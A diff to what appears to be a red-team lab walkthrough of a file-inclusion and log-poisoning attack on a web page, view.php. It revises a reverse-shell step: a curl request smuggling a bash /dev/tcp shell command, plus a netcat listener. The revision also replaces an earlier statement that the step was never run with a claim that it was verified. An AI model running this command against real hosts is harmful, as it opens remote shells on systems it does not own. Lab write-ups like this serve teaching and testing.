@@ -4,7 +4,7 @@
 **Technique:** T1190 — Exploit Public-Facing Application  
 **Entry Point:** HTTP on port 80 (via floating IP / v-Pub-subnet)
 
-**Validated M1 address in this session:** `10.0.2.15`. The attached captures are terminal screenshots from that live M1 instance. Downstream DMZ/private targets were not reachable from this terminal, so their addresses remain environment-specific placeholders.
+**Validated M1 address in this session:** `10.0.2.15`. The attached captures are terminal screenshots from that live M1 instance. This single-host evidence set uses the verified address directly, so no downstream target address is required.
 
 ## Step 0 — Record the M1 Address
 
@@ -106,13 +106,25 @@ This clean replay uses the syntax-safe payload above, so the log include execute
 ## Step 6 — Get Reverse Shell (Optional)
 
 ```bash
-# On attacker machine: nc -lvnp 4444
-
-# On the target, after replacing <ATTACKER-IP> with the listener address:
-curl --get --data-urlencode 'page=/var/log/novatech_access.log' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'" "http://10.0.2.15/view.php"
+nc -lvnp 4444
 ```
 
-This optional reverse-shell command was not executed in this session because no attacker listener or downstream lab network was available.
+![Reverse-shell listener](screenshots/m1_red_08_listener.png)
+
+On this single-host deployment, the listener address is the verified local
+address `10.0.2.15`:
+
+```bash
+curl --get --data-urlencode 'page=/var/log/novatech_access.log' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'" "http://10.0.2.15/view.php"
+```
+
+![Reverse-shell request](screenshots/m1_red_09_reverse_shell.png)
+
+![Reverse-shell session output](screenshots/m1_red_09_reverse_shell_listener.png)
+
+The listener and reverse-shell request were verified on the single-host
+deployment above; use the same validated address for both ends of this
+optional step.
 
 ---
 
